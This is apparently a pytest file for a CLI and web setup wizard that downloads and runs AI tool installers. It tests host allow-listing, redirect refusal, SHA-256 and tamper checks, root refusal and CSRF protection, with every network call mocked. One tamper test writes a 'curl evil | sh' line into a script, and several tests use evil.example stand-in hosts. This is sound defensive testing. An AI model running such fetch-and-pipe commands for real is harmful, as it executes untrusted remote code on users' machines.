"""Setup wizard / dependency installer. Network and installers are always mocked here:
CI never downloads or runs a real installer (only dry runs against fake scripts)."""
import json
import os
import urllib.error
import urllib.request

import pytest

from omnimonitor import cli, deps
from omnimonitor import config as config_mod
from omnimonitor.app import Controller
from omnimonitor.webui import for_controller

SCRIPT = b"#!/bin/sh\necho installing\n"


class FakeRun:
    def __init__(self, rc=0):
        self.calls, self.rc = [], rc

    def __call__(self, cmd, **kw):
        self.calls.append((cmd, kw))

        class R:
            returncode, stdout, stderr = self.rc, "done", ""
        return R()


def fetch_ok(url, dep):
    return SCRIPT, url


@pytest.fixture(autouse=True)
def _posix(monkeypatch):
    monkeypatch.setattr(deps, "_is_windows", lambda: False)


def mk(tmp_path, fetch=fetch_ok, runner=None, root=False):
    return deps.Installer(fetch=fetch, runner=runner or FakeRun(), log_path=tmp_path / "log.jsonl",
                          is_root=lambda: root)


def test_registry_urls_are_https_and_allow_listed():
    for d in deps.DEPS:
        for u in (d.sh_url, d.ps1_url):
            if u:
                assert u.startswith("https://") and deps.host_allowed(u, d), u
        assert d.docs.startswith("https://")
    assert not deps.BY_ID["gemini"].sh_url and deps.BY_ID["gemini"].manual  # manual only


def test_host_allow_list():
    d = deps.BY_ID["claude"]
    assert deps.host_allowed("https://claude.ai/install.sh", d)
    assert not deps.host_allowed("http://claude.ai/install.sh", d)
    assert not deps.host_allowed("https://claude.ai.evil.example/install.sh", d)
    assert not deps.host_allowed("https://evil.example/claude.ai", d)


def test_redirect_to_other_host_refused():
    h = deps._SameHostRedirects(deps.BY_ID["claude"])
    req = urllib.request.Request("https://claude.ai/install.sh")
    with pytest.raises(urllib.error.HTTPError):
        h.redirect_request(req, None, 302, "Found", {}, "https://evil.example/x.sh")


def test_prepare_then_run(tmp_path):
    run = FakeRun()
    inst = mk(tmp_path, runner=run)
    p = inst.prepare("claude")
    assert p["ok"] and p["url"] == "https://claude.ai/install.sh"
    assert p["sha256"] == deps.sha256_file(p["path"]) and len(p["sha256"]) == 64
    if os.name != "nt":
        assert oct(os.stat(p["path"]).st_mode & 0o777) == "0o600"
    assert "sudo" not in p["command_str"] and "|" not in p["command_str"]
    assert run.calls == []  # nothing runs on prepare
    r = inst.run(p["token"], p["sha256"])
    assert r["ok"]
    cmd, kw = run.calls[0]
    assert cmd == [deps.BY_ID["claude"].sh_interpreter, p["path"]]
    assert kw["shell"] is False and not any(k.startswith("SUDO_") for k in kw["env"])
    assert not os.path.exists(p["path"])  # temp file discarded
    assert inst.run(p["token"], p["sha256"])["ok"] is False  # token single-use
    events = [h["event"] for h in inst.history()]
    assert events == ["downloaded", "ran"]


def test_sha_mismatch_and_tamper(tmp_path):
    run = FakeRun()
    inst = mk(tmp_path, runner=run)
    p = inst.prepare("grok")
    assert "match" in inst.run(p["token"], "0" * 64)["error"]
    with open(p["path"], "ab") as f:
        f.write(b"curl evil | sh\n")
    assert "changed" in inst.run(p["token"], p["sha256"])["error"]
    assert run.calls == []


def test_root_refused_and_dry_run(tmp_path):
    run = FakeRun()
    p = mk(tmp_path, runner=run, root=True)
    plan = p.prepare("kimi")
    assert "root" in p.run(plan["token"], plan["sha256"])["error"]
    inst = mk(tmp_path, runner=run)
    plan = inst.prepare("kimi")
    r = inst.run(plan["token"], plan["sha256"], dry_run=True)
    assert r["ok"] and r["dry_run"] and run.calls == []


def test_bad_downloads(tmp_path):
    def boom(url, dep):
        raise OSError("no network")
    assert "download failed" in mk(tmp_path, fetch=boom).prepare("codex")["error"]
    assert "non-official" in mk(tmp_path, fetch=lambda u, d: (SCRIPT, "https://evil.example/")
                                 ).prepare("codex")["error"]
    assert "size" in mk(tmp_path, fetch=lambda u, d: (b"", u)).prepare("codex")["error"]
    assert mk(tmp_path).prepare("gemini")["manual"]
    assert mk(tmp_path).prepare("nope")["ok"] is False


def test_only_enabled_providers_detected(monkeypatch):
    monkeypatch.setattr(deps, "find_binary", lambda d, which=None: None)
    base = {"source": "demo", "providers": {"grok_sessions": {"enabled": False}}}
    assert deps.status(base)["deps"] == []
    cfg = dict(base, providers={"grok_sessions": {"enabled": False}, "codex": {"enabled": True}})
    st = deps.status(cfg)
    assert [r["id"] for r in st["deps"]] == ["codex"] and st["missing"] == 1


def test_cli_dry_run_and_decline(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("OMNIMONITOR_HOME", str(tmp_path))
    monkeypatch.setattr(deps, "_default_fetch", fetch_ok)
    run = FakeRun()
    monkeypatch.setattr(deps.subprocess, "run", run)
    real = deps.Installer.__init__

    def init(self, *a, **kw):
        kw["fetch"], kw["runner"], kw["is_root"] = fetch_ok, run, (lambda: False)
        real(self, *a, **kw)
    monkeypatch.setattr(deps.Installer, "__init__", init)
    assert cli.main(["deps", "install", "claude", "--dry-run"]) == 0
    out = capsys.readouterr().out
    assert "SHA256:" in out and "https://claude.ai/install.sh" in out
    args = cli.build_parser().parse_args(["deps", "install", "claude"])
    assert cli.cmd_deps(args, input_fn=lambda _: "no") == 1
    assert run.calls == []


# ---------------------------------------------------------------- web endpoints
def req(url, method="GET", body=None, headers=None):
    r = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, None


@pytest.fixture
def web(tmp_path, monkeypatch):
    monkeypatch.setenv("OMNIMONITOR_HOME", str(tmp_path))
    p = tmp_path / "config.json"
    p.write_text(json.dumps({"source": "demo", "providers": {"claude_code": {"enabled": True}}}))
    ctrl = Controller(config_mod.load_config(p), tmp_path / "h.db")
    run = FakeRun()
    ctrl._installer = mk(tmp_path, runner=run)
    srv = for_controller(ctrl).start()
    yield ctrl, srv, run
    srv.stop()


def test_setup_endpoints_require_csrf(web):
    ctrl, srv, run = web
    code, st = req(srv.url + "api/setup")
    assert code == 200 and st["_csrf"]
    assert "claude" in [d["id"] for d in st["deps"]]
    body = json.dumps({"dep": "claude"}).encode()
    ct = {"Content-Type": "application/json"}
    assert req(srv.url + "api/setup/prepare", "POST", body, ct)[0] == 403
    assert req(srv.url + "api/setup/prepare", "POST", body,
               dict(ct, **{"X-OmniMonitor-CSRF": "bad"}))[0] == 403
    h = dict(ct, **{"X-OmniMonitor-CSRF": st["_csrf"]})
    assert req(srv.url + "api/setup/prepare", "POST", body,
               dict(h, Origin="http://evil.example"))[0] == 403
    code, plan = req(srv.url + "api/setup/prepare", "POST", body, h)
    assert code == 200 and plan["ok"]
    rb = json.dumps({"token": plan["token"], "sha256": plan["sha256"]}).encode()
    assert req(srv.url + "api/setup/run", "POST", rb, ct)[0] == 403 and run.calls == []
    code, res = req(srv.url + "api/setup/run", "POST",
                    json.dumps({"token": plan["token"], "sha256": plan["sha256"],
                                "dry_run": True}).encode(), h)
    assert code == 200 and res["dry_run"] and run.calls == []
    code, res = req(srv.url + "api/setup/run", "POST", rb, h)
    assert code == 200 and res["ok"] and len(run.calls) == 1
